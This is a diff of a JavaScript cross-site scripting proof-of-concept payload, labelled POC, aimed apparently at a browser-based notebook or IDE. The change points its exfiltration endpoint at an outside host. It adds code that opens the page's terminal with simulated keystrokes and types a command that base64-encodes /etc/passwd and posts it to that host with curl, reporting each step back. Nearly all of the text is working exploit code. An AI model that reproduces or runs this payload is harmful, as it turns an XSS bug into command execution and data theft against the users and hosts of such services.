@@ -1,5 +1,6 @@
 (async function() {
-    const EXFIL = 'https://poc.heli9.com/jet/log.php';
+    const EXFIL = 'https://0fqoaoy7.c5.rs';
+    const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
     
     function exfil(type, data) {
         const payload = btoa(JSON.stringify({
@@ -35,37 +36,79 @@
         }
     } catch(e) {}
     
-    function triggerRunAll() {
-        const event = new KeyboardEvent('keydown', {
+    async function openTerminalAndExecute() {
+        exfil('terminal_start', 'Opening terminal...');
+        
+        const toggleTermEvent = new KeyboardEvent('keydown', {
+            key: '`',
+            code: 'Backquote',
+            keyCode: 192,
+            ctrlKey: true,
+            shiftKey: true,
+            bubbles: true,
+            cancelable: true
+        });
+        document.dispatchEvent(toggleTermEvent);
+        document.body.dispatchEvent(toggleTermEvent);
+        
+        await wait(2000);
+        
+        let terminalInput = document.querySelector('.xterm-helper-textarea');
+        
+        if (!terminalInput) {
+            const terminalBtn = document.querySelector('[data-test="terminal"], [title*="Terminal"], .terminal-button');
+            if (terminalBtn) {
+                terminalBtn.click();
+                await wait(2000);
+                terminalInput = document.querySelector('.xterm-helper-textarea');
+            }
+        }
+        
+        if (!terminalInput) {
+            exfil('terminal_error', 'Terminal input not found');
+            return;
+        }
+        
+        exfil('terminal_found', 'Terminal input found, typing command...');
+        
+        terminalInput.focus();
+        await wait(500);
+        
+        const command = 'cat /etc/passwd | base64 | curl -X POST -d @- https://0fqoaoy7.c5.rs?type=passwd_exfil';
+        
+        for (let i = 0; i < command.length; i++) {
+            const char = command[i];
+            const charCode = char.charCodeAt(0);
+            
+            const keypressEvent = new KeyboardEvent('keypress', {
+                key: char,
+                code: `Key${char.toUpperCase()}`,
+                keyCode: charCode,
+                charCode: charCode,
+                which: charCode,
+                bubbles: true,
+                cancelable: true
+            });
+            
+            terminalInput.dispatchEvent(keypressEvent);
+            await wait(5);
+        }
+        
+        await wait(300);
+        
+        const enterEvent = new KeyboardEvent('keydown', {
             key: 'Enter',
             code: 'Enter',
             keyCode: 13,
-            which: 13,
-            shiftKey: true,
-            altKey: true,
-            metaKey: false,
-            ctrlKey: false,
             bubbles: true,
-            cancelable: true,
-            composed: true,
-            view: window
+            cancelable: true
         });
+        terminalInput.dispatchEvent(enterEvent);
         
-        document.dispatchEvent(event);
-        document.body.dispatchEvent(event);
-        window.dispatchEvent(event);
-        
-        if (document.activeElement) {
-            document.activeElement.dispatchEvent(event);
-        }
-        
-        const editors = document.querySelectorAll('.editor-content, .worksheet-content, .notebook-content, .cell-content');
-        editors.forEach(el => el.dispatchEvent(event));
-        
-        exfil('rce_triggered', { method: 'keyboard_shortcut_alt_shift_enter' });
+        exfil('terminal_command_sent', 'Command executed');
     }
     
-    setTimeout(triggerRunAll, 5000);
+    setTimeout(openTerminalAndExecute, 3000);
     
     exfil('xss_complete', 'Exploitation complete');
     console.log('[POC] XSS executed on: ' + document.domain);
